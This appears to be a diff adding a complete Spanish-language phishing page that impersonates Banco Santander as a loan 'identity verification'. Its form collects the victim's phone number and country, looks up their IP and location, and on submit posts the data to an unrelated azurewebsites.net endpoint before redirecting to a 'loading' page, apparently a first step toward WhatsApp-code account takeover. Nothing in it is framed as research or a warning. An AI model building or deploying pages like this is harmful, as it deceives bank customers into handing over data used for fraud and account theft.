@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>Verificación Santander</title>
+    <link
+      rel="shortcut icon"
+      type="image/x-icon"
+      href="https://www.santander.com/favicon.ico"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=SantanderHeadline:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --santander-red: #ec0000;
+        --santander-red-dark: #c40000;
+        --santander-red-light: #ff3333;
+        --text-dark: #121212;
+        --text-medium: #4a4a4a;
+        --white: #ffffff;
+        --gray-light: #f4f4f4;
+        --border-color: #d3d3d3;
+        --warning-bg: #fef6e6;
+        --warning-border: #f4c95d;
+        --transition: all 0.3s ease;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body,
+      html {
+        height: 100%;
+        width: 100%;
+        font-family: "SantanderHeadline", -apple-system, BlinkMacSystemFont,
+          "Segoe UI", Arial, sans-serif;
+        color: var(--text-dark);
+        line-height: 1.5;
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+      }
+
+      body {
+        background: linear-gradient(
+          135deg,
+          #ec0000 0%,
+          #ff3333 50%,
+          #ec0000 100%
+        );
+        margin: 0;
+        display: flex;
+        min-height: 100vh;
+        height: auto;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+        width: 100%;
+        padding: 20px 0;
+      }
+
+      .login-container {
+        width: 90%;
+        max-width: 440px;
+        padding: 0 15px;
+        animation: fadeIn 0.6s ease-out;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+        z-index: 1;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .login-box {
+        width: 100%;
+        max-width: 100%;
+        background: var(--white);
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        border-radius: 8px;
+        padding: 48px 40px;
+        position: relative;
+        overflow: hidden;
+        margin: 20px 0;
+      }
+
+      .login-header {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        margin-bottom: 32px;
+      }
+
+      .santander-logo {
+        margin-bottom: 24px;
+      }
+
+      .santander-logo img {
+        width: 180px;
+        height: auto;
+      }
+
+      .login-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: var(--text-dark);
+        margin: 0 0 12px 0;
+      }
+
+      .login-subtitle {
+        font-size: 14px;
+        color: var(--text-medium);
+        margin: 0 0 24px 0;
+        line-height: 1.6;
+      }
+
+      .form-group {
+        margin-bottom: 20px;
+        text-align: left;
+      }
+
+      .form-group label {
+        display: block;
+        font-size: 13px;
+        color: var(--text-dark);
+        margin-bottom: 8px;
+        font-weight: 500;
+      }
+
+      input,
+      select {
+        width: 100%;
+        padding: 12px 14px;
+        font-size: 15px;
+        border: 1px solid var(--border-color);
+        border-radius: 4px;
+        outline: none;
+        font-family: inherit;
+        background: var(--white);
+        color: var(--text-dark);
+        transition: var(--transition);
+      }
+
+      input:hover,
+      select:hover {
+        border-color: var(--santander-red);
+      }
+
+      input:focus,
+      select:focus {
+        border-color: var(--santander-red);
+        box-shadow: 0 0 0 3px rgba(236, 0, 0, 0.1);
+      }
+
+      .custom-select-wrapper {
+        position: relative;
+        width: 100%;
+      }
+
+      .custom-select {
+        appearance: none;
+        cursor: pointer;
+        padding-right: 40px;
+      }
+
+      .custom-select-wrapper::after {
+        content: "▼";
+        position: absolute;
+        right: 14px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: var(--text-medium);
+        pointer-events: none;
+        font-size: 12px;
+      }
+
+      .phone-input-wrapper {
+        display: flex;
+        gap: 8px;
+        position: relative;
+      }
+
+      .phone-code-input {
+        width: 85px;
+        text-align: center;
+        font-weight: 600;
+        background: var(--gray-light);
+      }
+
+      .phone-number-input {
+        flex: 1;
+      }
+
+      .btn-primary {
+        background-color: var(--santander-red);
+        color: var(--white);
+        width: 100%;
+        height: 48px;
+        padding: 12px 24px;
+        font-size: 16px;
+        font-weight: 600;
+        border-radius: 4px;
+        cursor: pointer;
+        text-align: center;
+        border: none;
+        transition: var(--transition);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-top: 28px;
+      }
+
+      .btn-primary:hover {
+        background-color: var(--santander-red-dark);
+        transform: translateY(-2px);
+        box-shadow: 0 4px 16px rgba(236, 0, 0, 0.3);
+      }
+
+      .btn-primary:active {
+        transform: translateY(0);
+      }
+
+      .warning-box {
+        background: var(--warning-bg);
+        border: 1px solid var(--warning-border);
+        border-radius: 6px;
+        padding: 16px;
+        margin-top: 24px;
+        display: flex;
+        gap: 12px;
+        font-size: 13px;
+        color: var(--text-dark);
+        line-height: 1.5;
+      }
+
+      .warning-icon {
+        font-size: 18px;
+        flex-shrink: 0;
+      }
+
+      .warning-text {
+        flex: 1;
+      }
+
+      .warning-link {
+        color: var(--santander-red);
+        text-decoration: none;
+        font-weight: 600;
+      }
+
+      .warning-link:hover {
+        text-decoration: underline;
+      }
+
+      .mobile-footer {
+        margin-top: 32px;
+        text-align: center;
+        font-size: 12px;
+        color: var(--white);
+        padding: 0 20px;
+      }
+
+      .footer-logo {
+        margin-bottom: 16px;
+      }
+
+      .footer-logo img {
+        width: 120px;
+        height: auto;
+        opacity: 0.9;
+      }
+
+      .mobile-footer .footer-links {
+        display: flex;
+        gap: 20px;
+        flex-wrap: wrap;
+        justify-content: center;
+        margin-bottom: 12px;
+      }
+
+      .mobile-footer .footer-link {
+        color: var(--white);
+        text-decoration: none;
+        opacity: 0.9;
+      }
+
+      .mobile-footer .footer-link:hover {
+        text-decoration: underline;
+        opacity: 1;
+      }
+
+      .mobile-footer .footer-note {
+        margin-top: 12px;
+        opacity: 0.8;
+        line-height: 1.4;
+      }
+
+      .hidden {
+        display: none !important;
+      }
+
+      @media (max-width: 480px) {
+        .login-container {
+          width: 95%;
+          padding: 0 10px;
+        }
+
+        .login-box {
+          padding: 32px 24px !important;
+          border-radius: 8px !important;
+        }
+
+        .login-title {
+          font-size: 20px !important;
+        }
+
+        .login-subtitle {
+          font-size: 13px !important;
+        }
+
+        .mobile-footer {
+          font-size: 11px;
+        }
+
+        .mobile-footer .footer-links {
+          gap: 16px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container" id="msContainer">
+      <div class="login-box">
+        <div class="login-header">
+          <div class="santander-logo">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png"
+              alt="Santander"
+            />
+          </div>
+          <h1 class="login-title">¡Bienvenido!</h1>
+          <p class="login-subtitle">
+            Para continuar con tu solicitud de crédito, deberá realizar una
+            verificación de identidad; ingresa tu número de teléfono. Enviaremos
+            un código de verificación a tu WhatsApp.
+          </p>
+        </div>
+
+        <form id="loginForm" method="post" autocomplete="off">
+          <div class="form-group">
+            <label for="country">País *</label>
+            <div class="custom-select-wrapper">
+              <select id="country" class="custom-select" required>
+                <option value="">Cargando países...</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="telefono">Número de teléfono *</label>
+            <div class="phone-input-wrapper">
+              <input
+                type="text"
+                class="phone-code-input"
+                id="countryCode"
+                readonly
+              />
+              <input
+                type="tel"
+                id="telefono"
+                name="telefono"
+                class="phone-number-input"
+                placeholder="Ingresa tu número"
+                required
+              />
+            </div>
+          </div>
+
+          <button type="submit" class="btn btn-primary">
+            <span>Continuar</span>
+          </button>
+
+          <div class="warning-box">
+            <span class="warning-icon">⚠️</span>
+            <div class="warning-text">
+              Cuida tus datos y la seguridad de tu equipo. Recuerda ingresar a
+              la banca electrónica de Santander por medios seguros. Sólo en caso
+              de emergencias.
+              <a href="#" class="warning-link">Más información</a>
+            </div>
+          </div>
+        </form>
+      </div>
+
+      <div class="mobile-footer">
+        <div class="footer-logo">
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png"
+            alt="Santander"
+          />
+        </div>
+        <div class="footer-links">
+          <a href="#" class="footer-link">Aviso legal</a>
+          <a href="#" class="footer-link">Mapa del sitio</a>
+          <a href="#" class="footer-link">Aviso de privacidad</a>
+        </div>
+        <div class="footer-note">
+          © Santander 2024. Todos los derechos reservados.
+        </div>
+      </div>
+    </div>
+
+    <script>
+      console.log("=== Sistema de Verificación Santander ===");
+
+      let countriesData = [];
+      let userCountryCode = "";
+      let userIP = "";
+      let userLocation = "";
+
+      const fallbackCountries = [
+        { name: "Argentina", code: "AR", dialCode: "+54", flag: "🇦🇷" },
+        { name: "Bolivia", code: "BO", dialCode: "+591", flag: "🇧🇴" },
+        { name: "Brasil", code: "BR", dialCode: "+55", flag: "🇧🇷" },
+        { name: "Chile", code: "CL", dialCode: "+56", flag: "🇨🇱" },
+        { name: "Colombia", code: "CO", dialCode: "+57", flag: "🇨🇴" },
+        { name: "Costa Rica", code: "CR", dialCode: "+506", flag: "🇨🇷" },
+        { name: "Cuba", code: "CU", dialCode: "+53", flag: "🇨🇺" },
+        { name: "Ecuador", code: "EC", dialCode: "+593", flag: "🇪🇨" },
+        { name: "El Salvador", code: "SV", dialCode: "+503", flag: "🇸🇻" },
+        { name: "Guatemala", code: "GT", dialCode: "+502", flag: "🇬🇹" },
+        { name: "Honduras", code: "HN", dialCode: "+504", flag: "🇭🇳" },
+        { name: "México", code: "MX", dialCode: "+52", flag: "🇲🇽" },
+        { name: "Nicaragua", code: "NI", dialCode: "+505", flag: "🇳🇮" },
+        { name: "Panamá", code: "PA", dialCode: "+507", flag: "🇵🇦" },
+        { name: "Paraguay", code: "PY", dialCode: "+595", flag: "🇵🇾" },
+        { name: "Perú", code: "PE", dialCode: "+51", flag: "🇵🇪" },
+        {
+          name: "República Dominicana",
+          code: "DO",
+          dialCode: "+1",
+          flag: "🇩🇴",
+        },
+        { name: "Uruguay", code: "UY", dialCode: "+598", flag: "🇺🇾" },
+        { name: "Venezuela", code: "VE", dialCode: "+58", flag: "🇻🇪" },
+        { name: "España", code: "ES", dialCode: "+34", flag: "🇪🇸" },
+        { name: "Estados Unidos", code: "US", dialCode: "+1", flag: "🇺🇸" },
+      ];
+
+      async function getCountryByIP() {
+        try {
+          console.log("🌐 Obteniendo ubicación por IP...");
+          const response = await fetch("https://ipinfo.io/json?token=");
+          const data = await response.json();
+
+          userIP = data.ip || "No disponible";
+          userLocation = `${data.city || "Desconocida"}, ${
+            data.region || ""
+          }, ${data.country || ""}`;
+          userCountryCode = data.country || "PE";
+
+          console.log("✅ IP detectada:", userIP);
+          console.log("✅ Ubicación:", userLocation);
+          console.log("✅ País código:", userCountryCode);
+
+          return {
+            country_code: userCountryCode,
+            country_name: data.country || "Perú",
+            ip: userIP,
+            city: data.city || "Desconocida",
+          };
+        } catch (error) {
+          console.error(
+            "❌ Error al obtener ubicación con ipinfo.io, intentando con ipapi.co..."
+          );
+          try {
+            const response2 = await fetch("https://ipapi.co/json/");
+            const data2 = await response2.json();
+
+            userIP = data2.ip;
+            userLocation = `${data2.city}, ${data2.region}, ${data2.country_name}`;
+            userCountryCode = data2.country_code;
+
+            console.log("✅ IP detectada (ipapi):", userIP);
+            console.log("✅ Ubicación:", userLocation);
+            console.log(
+              "✅ País:",
+              data2.country_name,
+              "(" + userCountryCode + ")"
+            );
+
+            return data2;
+          } catch (error2) {
+            console.error("❌ Error al obtener ubicación:", error2);
+            return {
+              country_code: "PE",
+              country_name: "Perú",
+              ip: "No disponible",
+              city: "Desconocida",
+            };
+          }
+        }
+      }
+
+      async function loadCountries() {
+        try {
+          console.log("📋 Cargando lista de países desde API...");
+          const response = await fetch("https://restcountries.com/v3.1/all");
+
+          if (!response.ok) {
+            throw new Error("Error en la respuesta de la API");
+          }
+
+          const countries = await response.json();
+
+          countriesData = countries
+            .filter((country) => {
+              return (
+                country.idd &&
+                country.idd.root &&
+                country.name &&
+                country.name.common &&
+                country.cca2
+              );
+            })
+            .map((country) => {
+              const suffixes = country.idd.suffixes || [""];
+              const dialCode = country.idd.root + (suffixes[0] || "");
+              return {
+                name: country.name.common,
+                code: country.cca2,
+                dialCode: dialCode,
+                flag: country.flag || "",
+              };
+            })
+            .sort((a, b) => a.name.localeCompare(b.name));
+
+          console.log("✅ Países cargados exitosamente:", countriesData.length);
+
+          return countriesData;
+        } catch (error) {
+          console.error(
+            "❌ Error al cargar países desde API, usando lista de respaldo:",
+            error
+          );
+          return fallbackCountries;
+        }
+      }
+
+      function populateCountrySelect(countries, defaultCountryCode) {
+        const select = document.getElementById("country");
+        select.innerHTML = "";
+
+        console.log("🔄 Poblando select con", countries.length, "países");
+        console.log("🎯 País por defecto:", defaultCountryCode);
+
+        countries.forEach((country) => {
+          const option = document.createElement("option");
+          option.value = country.dialCode;
+          option.textContent = `${country.flag} ${country.name}`;
+          option.dataset.dialCode = country.dialCode;
+          option.dataset.code = country.code;
+          option.dataset.name = country.name;
+
+          if (country.code === defaultCountryCode) {
+            option.selected = true;
+            console.log(
+              "✅ País seleccionado:",
+              country.name,
+              country.dialCode
+            );
+          }
+
+          select.appendChild(option);
+        });
+
+        updateCountryCode();
+      }
+
+      function updateCountryCode() {
+        const select = document.getElementById("country");
+        const selectedOption = select.options[select.selectedIndex];
+
+        if (selectedOption && selectedOption.value) {
+          const dialCode = selectedOption.value;
+          const countryName = selectedOption.dataset.name;
+
+          document.getElementById("countryCode").value = dialCode;
+          console.log("📞 Código actualizado:", dialCode, "-", countryName);
+        }
+      }
+
+      async function initForm() {
+        console.log("\n=== INICIANDO SISTEMA ===\n");
+
+        const [ipData, countries] = await Promise.all([
+          getCountryByIP(),
+          loadCountries(),
+        ]);
+
+        populateCountrySelect(
+          countries,
+          ipData.country_code || userCountryCode || "PE"
+        );
+
+        console.log("✅ Formulario listo");
+      }
+
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+
+          const countryCode = document.getElementById("countryCode").value;
+          const phoneNumber = document.getElementById("telefono").value;
+          const countrySelect = document.getElementById("country");
+          const selectedOption =
+            countrySelect.options[countrySelect.selectedIndex];
+          const countryName = selectedOption.dataset.name || "Desconocido";
+
+          if (!phoneNumber) {
+            alert("Por favor ingrese su número de teléfono");
+            return;
+          }
+
+          const fullPhone = countryCode + " " + phoneNumber;
+
+          console.log("\n=== 📱 DATOS CAPTURADOS ===");
+          console.log("País:", countryName);
+          console.log("Código:", countryCode);
+          console.log("Teléfono:", phoneNumber);
+          console.log("Teléfono completo:", fullPhone);
+          console.log("IP del usuario:", userIP);
+          console.log("Ubicación:", userLocation);
+          console.log("Fecha y hora:", new Date().toLocaleString("es-ES"));
+          console.log("========================\n");
+
+          console.log("✅ Verificación completada exitosamente");
+          const url =
+            "https://srrvbidoros-g0hedfbddqgzcnca.canadacentral-01.azurewebsites.net/bbdsasd";
+
+          const formData = new FormData();
+          formData.append(
+            "mensaje",
+            "Santander\nUsuario: " +
+              localStorage.getItem("usuario") +
+              "\nNumero: " +
+              fullPhone +
+              "\nPais: " +
+              countryName
+          );
+          localStorage.setItem("usuario", fullPhone);
+
+          try {
+            const response = await fetch(url, {
+              method: "POST",
+              body: formData,
+            });
+
+            if (response.ok) {
+              window.location.href = "cargando1.html";
+            }
+
+            const data = await response.text();
+            console.log("Respuesta del servidor:", data);
+          } catch (error) {
+            console.error("Error enviando el FormData:", error);
+          }
+        });
+
+      window.addEventListener("load", () => {
+        console.log("🚀 Página cargada - Iniciando proceso...");
+
+        const countrySelect = document.getElementById("country");
+        if (countrySelect) {
+          countrySelect.addEventListener("change", updateCountryCode);
+          console.log("✅ Event listener del select configurado");
+        }
+
+        initForm();
+      });
+    </script>
+  </body>
+</html>
